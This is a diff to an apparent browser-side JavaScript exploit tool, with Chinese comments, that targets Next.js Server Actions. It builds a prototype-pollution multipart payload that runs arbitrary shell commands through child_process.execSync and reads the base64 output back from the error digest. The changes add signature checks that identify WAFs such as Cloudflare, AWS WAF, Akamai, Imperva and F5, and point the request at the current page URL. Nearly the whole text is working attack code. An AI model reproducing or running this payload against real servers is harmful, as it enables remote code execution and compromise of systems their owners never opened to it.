@@ -44,13 +44,29 @@ async function performFingerprint() {
     }
 }
 
+// === WAF Detection Logic ===
+function detectWAF(headers, bodyText, status) {
+    const wafSigs = [
+        { name: "Cloudflare", check: () => headers.get('server') === 'cloudflare' || headers.has('cf-ray') || bodyText.includes('Cloudflare') },
+        { name: "AWS WAF", check: () => headers.has('x-amzn-trace-id') || (status === 403 && headers.get('server') === 'Awselb/2.0') },
+        { name: "Akamai", check: () => headers.get('server') === 'AkamaiGHost' || headers.has('akamai-origin-hop') },
+        { name: "Imperva", check: () => headers.has('x-iinfo') || headers.has('x-cdn') || bodyText.includes('Incapsula') },
+        { name: "F5 BIG-IP", check: () => headers.has('x-cnection') || (headers.get('server') || '').includes('BigIP') },
+        { name: "Nginx Generic", check: () => (headers.get('server') || '').includes('nginx') && (status === 403 || status === 406) }
+    ];
+
+    for (const sig of wafSigs) {
+        if (sig.check()) return sig.name;
+    }
+    return null;
+}
+
 // === 3. RCE 漏洞利用 ===
 async function performExploit(cmd) {
     // 默认命令
     const targetCmd = cmd || "echo vulnerability_test";
     
     // 构造 Payload，动态插入命令
-    // 注意：这里需要处理 JS 转义，简单起见直接替换
     // Payload 逻辑: execSync('YOUR_CMD').toString().trim()
     const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
     const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
@@ -71,23 +87,21 @@ async function performExploit(cmd) {
         ''
     ].join('\r\n');
 
-    const targetUrl = "/adfa"; // 使用相对路径
+    const targetUrl = window.location.href; // Use current URL instead of hardcoded relative path
 
     try {
         const res = await fetch(targetUrl, {
             method: 'POST',
             headers: {
-                'Next-Action': 'x',
+                'Next-Action': 'x', // Specific header often triggering WAFs
                 'X-Nextjs-Request-Id': '7a3f9c1e',
-                'X-Nextjs-Html-Request-ld': '9bK2mPaRtVwXyZ3S@!sT7u',
-                'Content-Type': `multipart/form-data; boundary=${boundary}`,
-                'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9'
-                // Origin 头由浏览器自动管理，不手动添加
+                'Content-Type': `multipart/form-data; boundary=${boundary}`
             },
             body: bodyParts
         });
 
         const responseText = await res.text();
+        const wafName = detectWAF(res.headers, responseText, res.status);
 
         // 正则提取 digest 的值
         const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);
@@ -96,9 +110,7 @@ async function performExploit(cmd) {
             let rawBase64 = digestMatch[1];
             
             try {
-                // --- 修改点 2：解码逻辑 ---
-                
-                // 1. 先处理 JSON 字符串转义 (比如把 \" 变回 ")
+                // 1. 先处理 JSON 字符串转义
                 let cleanBase64 = JSON.parse(`"${rawBase64}"`);
                 
                 // 2. Base64 解码 + 编码自适应
@@ -110,7 +122,6 @@ async function performExploit(cmd) {
                 const decodeBytes = (b64) => Uint8Array.from(atob(b64), c => c.charCodeAt(0));
 
                 const safeDecode = (bytes) => {
-                    // 优先 UTF-8，若存在大量替换符，再尝试 gb18030 以兼容非 UTF-8（如部分 Windows/GBK 环境）
                     const tryDecode = (enc) => {
                         try { return new TextDecoder(enc).decode(bytes); } catch (e) { return null; }
                     };
@@ -124,23 +135,26 @@ async function performExploit(cmd) {
 
                 return { 
                     success: true, 
-                    output: decodedStr 
+                    output: decodedStr,
+                    waf: wafName
                 };
             } catch (parseError) {
                 return { 
                     success: false, 
                     msg: "Decoding Error: " + parseError.message, 
-                    debug: rawBase64 
+                    debug: rawBase64,
+                    waf: wafName
                 };
             }
         } else {
             return { 
                 success: false, 
                 msg: "Exploit Failed: 'digest' key not found.",
-                debug: responseText.substring(0, 500),  // Extended for debugging
+                debug: responseText.substring(0, 500),
                 httpStatus: res.status,
                 httpStatusText: res.statusText,
-                fullResponse: responseText.length > 2000 ? responseText.substring(0, 2000) + "...[truncated]" : responseText
+                fullResponse: responseText.length > 2000 ? responseText.substring(0, 2000) + "...[truncated]" : responseText,
+                waf: wafName
             };
         }
 
